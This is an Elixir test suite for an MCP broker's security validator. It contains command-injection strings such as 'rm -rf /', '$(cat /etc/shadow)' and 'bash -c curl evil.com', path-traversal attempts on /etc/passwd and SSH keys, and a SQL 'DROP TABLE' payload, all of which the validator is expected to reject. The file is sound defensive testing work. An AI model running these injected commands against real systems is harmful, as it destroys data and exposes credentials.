defmodule Lang.MCP.SecurityTest do
  @moduledoc """
  Comprehensive security tests for MCP broker security layer.

  These tests verify that the MCP broker properly isolates MCP servers,
  validates all requests, and prevents security vulnerabilities.
  """

  use ExUnit.Case, async: true
  alias Lang.MCP.Security

  describe "MCP config validation" do
    test "rejects dangerous filesystem paths" do
      dangerous_configs = [
        %{"root_path" => "../../../etc/passwd"},
        %{"root_path" => "/etc/shadow"},
        %{"root_path" => "~/.ssh/authorized_keys"},
        %{"root_path" => "/proc/self/environ"}
      ]

      Enum.each(dangerous_configs, fn config ->
        assert {:error, _reason} = Security.validate_mcp_config("filesystem", config)
      end)
    end

    test "rejects oversized configs" do
      large_config = %{"data" => String.duplicate("x", 2_000_000)}

      assert {:error, {:config_too_large, _size}} =
               Security.validate_mcp_config("filesystem", large_config)
    end

    test "allows safe filesystem configs" do
      safe_config = %{"root_path" => "workspace/project"}

      assert {:ok, _sanitized} = Security.validate_mcp_config("filesystem", safe_config)
    end

    test "validates git URLs properly" do
      valid_urls = [
        "https://github.com/user/repo.git",
        "git@github.com:user/repo.git",
        "ssh://git@github.com/user/repo.git"
      ]

      invalid_urls = [
        "file:///etc/passwd",
        "http://malicious.com/script.js",
        "javascript:alert('xss')"
      ]

      Enum.each(valid_urls, fn url ->
        config = %{"repository_url" => url}
        assert {:ok, _} = Security.validate_mcp_config("git", config)
      end)

      Enum.each(invalid_urls, fn url ->
        config = %{"repository_url" => url}
        assert {:error, _} = Security.validate_mcp_config("git", config)
      end)
    end
  end

  describe "MCP request validation" do
    test "blocks command injection attempts" do
      malicious_requests = [
        %{"method" => "fs/read", "params" => %{"path" => "file.txt; rm -rf /"}},
        %{"method" => "fs/read", "params" => %{"path" => "file.txt | cat /etc/passwd"}},
        %{"method" => "fs/read", "params" => %{"path" => "$(cat /etc/shadow)"}},
        %{"method" => "fs/read", "params" => %{"path" => "`whoami`"}},
        %{"method" => "fs/exec", "params" => %{"command" => "bash -c 'curl evil.com'"}}
      ]

      Enum.each(malicious_requests, fn request ->
        assert {:error, :dangerous_pattern_detected} =
                 Security.validate_mcp_request("filesystem", request)
      end)
    end

    test "blocks path traversal attempts" do
      path_traversal_requests = [
        %{"method" => "fs/read", "params" => %{"path" => "../../../etc/passwd"}},
        %{"method" => "fs/read", "params" => %{"path" => "..\\..\\windows\\system32"}},
        %{"method" => "fs/write", "params" => %{"path" => "/etc/../root/.bashrc"}},
        %{"method" => "fs/read", "params" => %{"uri" => "file:///etc/passwd"}}
      ]

      Enum.each(path_traversal_requests, fn request ->
        assert {:error, _reason} = Security.validate_mcp_request("filesystem", request)
      end)
    end

    test "validates file extensions" do
      # Allowed extensions
      safe_paths = [
        "document.md",
        "code.js",
        "data.json",
        "style.css",
        "README.txt"
      ]

      Enum.each(safe_paths, fn path ->
        assert :ok = Security.validate_file_path(path)
      end)

      # Dangerous extensions
      dangerous_paths = [
        "malware.exe",
        "script.bat",
        "trojan.scr",
        "virus.com",
        "backdoor.dll"
      ]

      Enum.each(dangerous_paths, fn path ->
        assert {:error, {:file_extension_not_allowed, _ext}} =
                 Security.validate_file_path(path)
      end)
    end

    test "rejects oversized requests" do
      large_request = %{
        "method" => "fs/write",
        "params" => %{
          "path" => "file.txt",
          "content" => String.duplicate("x", 2_000_000)
        }
      }

      assert {:error, {:request_too_large, _size}} =
               Security.validate_mcp_request("filesystem", large_request)
    end

    test "validates request structure" do
      invalid_requests = [
        # Missing method
        %{},
        # Missing method
        %{"params" => %{}},
        # Nil method
        %{"method" => nil},
        # Invalid method type
        %{"method" => 123}
      ]

      Enum.each(invalid_requests, fn request ->
        assert {:error, _reason} = Security.validate_mcp_request("filesystem", request)
      end)
    end

    test "limits nesting depth" do
      # Create deeply nested structure
      deep_nested =
        Enum.reduce(1..15, %{}, fn i, acc ->
          %{"level_#{i}" => acc}
        end)

      request = %{
        "method" => "test",
        "params" => %{"data" => deep_nested}
      }

      assert {:error, {:nesting_too_deep, _depth}} =
               Security.validate_mcp_request("filesystem", request)
    end

    test "allows valid safe requests" do
      safe_request = %{
        "method" => "fs/read",
        "params" => %{"path" => "workspace/document.md"}
      }

      assert {:ok, sanitized} = Security.validate_mcp_request("filesystem", safe_request)
      assert sanitized["method"] == "fs/read"
    end
  end

  describe "MCP response validation" do
    test "rejects oversized responses" do
      large_response = %{
        "result" => %{
          # 15MB
          "content" => String.duplicate("x", 15_000_000)
        }
      }

      assert {:error, {:response_too_large, _size}} =
               Security.validate_mcp_response("filesystem", large_response)
    end

    test "validates response content" do
      malicious_response = %{
        "result" => %{
          "files" => [
            %{"path" => "/etc/passwd", "content" => "root:x:0:0:root:/root:/bin/bash"},
            %{"path" => "../../../secret.key", "content" => "secret_data"}
          ]
        }
      }

      assert {:error, :dangerous_pattern_detected} =
               Security.validate_mcp_response("filesystem", malicious_response)
    end

    test "limits array sizes" do
      large_array = Enum.map(1..2000, fn i -> "item_#{i}" end)

      response = %{
        "result" => %{"items" => large_array}
      }

      assert {:error, {:array_too_long, _length}} =
               Security.validate_mcp_response("filesystem", response)
    end

    test "allows safe responses" do
      safe_response = %{
        "result" => %{
          "files" => [
            %{"path" => "document.md", "size" => 1024},
            %{"path" => "image.jpg", "size" => 2048}
          ]
        }
      }

      assert {:ok, sanitized} = Security.validate_mcp_response("filesystem", safe_response)
      assert is_map(sanitized["result"])
    end
  end

  describe "content sanitization" do
    test "trims and limits string length" do
      long_string = String.duplicate("a", 200_000)

      request = %{
        "method" => "test",
        "params" => %{"data" => "  #{long_string}  "}
      }

      assert {:ok, sanitized} = Security.validate_mcp_request("filesystem", request)
      sanitized_data = sanitized["params"]["data"]

      # Should be trimmed and limited
      assert String.length(sanitized_data) <= 100_000
      assert String.starts_with?(sanitized_data, "a")
      refute String.starts_with?(sanitized_data, " ")
    end

    test "sanitizes nested structures" do
      nested_request = %{
        "method" => "test",
        "params" => %{
          "config" => %{
            "  spaced_key  " => "  spaced_value  ",
            "normal_key" => ["  item1  ", "  item2  "]
          }
        }
      }

      assert {:ok, sanitized} = Security.validate_mcp_request("filesystem", nested_request)
      config = sanitized["params"]["config"]

      # Keys and values should be trimmed
      assert Map.has_key?(config, "spaced_key")
      assert config["spaced_key"] == "spaced_value"
      assert config["normal_key"] == ["item1", "item2"]
    end
  end

  describe "rate limiting integration" do
    test "respects rate limits" do
      user_id = "test_user_#{:rand.uniform(1000)}"

      # First request should succeed
      assert :ok = Security.check_rate_limit(user_id, "filesystem", "read")

      # Simulate rapid requests to trigger rate limit
      results =
        Enum.map(1..100, fn _ ->
          Security.check_rate_limit(user_id, "filesystem", "read")
        end)

      # Should eventually hit rate limit
      assert Enum.any?(results, &(&1 == {:error, :rate_limited}))
    end
  end

  describe "security event logging" do
    test "logs security violations" do
      # This would test that security events are properly logged
      # For now, just verify the validation catches the issue
      malicious_config = %{"root_path" => "../../../etc/passwd"}

      assert {:error, _reason} = Security.validate_mcp_config("filesystem", malicious_config)

      # In a real implementation, we'd verify the security event was logged
      # assert_received {:security_event, "mcp_config_rejected", %{reason: _}}
    end
  end

  describe "edge cases and error handling" do
    test "handles nil and invalid inputs gracefully" do
      invalid_inputs = [
        nil,
        "",
        123,
        [],
        %{invalid: :structure}
      ]

      Enum.each(invalid_inputs, fn input ->
        result = Security.validate_mcp_request("filesystem", input)
        assert {:error, _reason} = result
      end)
    end

    test "handles unicode and encoding issues" do
      unicode_request = %{
        "method" => "fs/read",
        "params" => %{
          # Chinese characters
          "path" => "文档.txt",
          "encoding" => "UTF-8"
        }
      }

      # Should handle unicode gracefully
      assert {:ok, _sanitized} = Security.validate_mcp_request("filesystem", unicode_request)
    end

    test "validates binary data properly" do
      binary_request = %{
        "method" => "fs/write",
        "params" => %{
          "path" => "image.jpg",
          # PNG header
          "content" => Base.encode64(<<137, 80, 78, 71, 13, 10, 26, 10>>)
        }
      }

      assert {:ok, _sanitized} = Security.validate_mcp_request("filesystem", binary_request)
    end
  end

  describe "server type specific validation" do
    test "validates git-specific patterns" do
      git_request = %{
        "method" => "git/clone",
        "params" => %{
          "repository" => "https://github.com/user/repo.git",
          "ref" => "main"
        }
      }

      assert {:ok, _sanitized} = Security.validate_mcp_request("git", git_request)

      # Invalid git ref
      invalid_git_request = %{
        "method" => "git/clone",
        "params" => %{
          "repository" => "https://github.com/user/repo.git",
          "ref" => "main; rm -rf /"
        }
      }

      assert {:error, :invalid_git_ref} =
               Security.validate_mcp_request("git", invalid_git_request)
    end

    test "validates database-specific patterns" do
      # Database requests should not allow dangerous SQL
      db_request = %{
        "method" => "db/query",
        "params" => %{
          "query" => "SELECT * FROM users; DROP TABLE users; --"
        }
      }

      assert {:error, :dangerous_pattern_detected} =
               Security.validate_mcp_request("database", db_request)
    end
  end

  describe "performance under attack" do
    test "handles rapid malicious requests efficiently" do
      start_time = System.monotonic_time(:millisecond)

      # Generate many malicious requests
      malicious_requests =
        Enum.map(1..100, fn i ->
          %{
            "method" => "fs/read",
            "params" => %{"path" => "../../../etc/passwd#{i}"}
          }
        end)

      # Process all requests
      results =
        Enum.map(malicious_requests, fn request ->
          Security.validate_mcp_request("filesystem", request)
        end)

      end_time = System.monotonic_time(:millisecond)
      processing_time = end_time - start_time

      # All should be rejected
      assert Enum.all?(results, &match?({:error, _}, &1))

      # Should complete in reasonable time (less than 1 second)
      assert processing_time < 1000
    end
  end
end
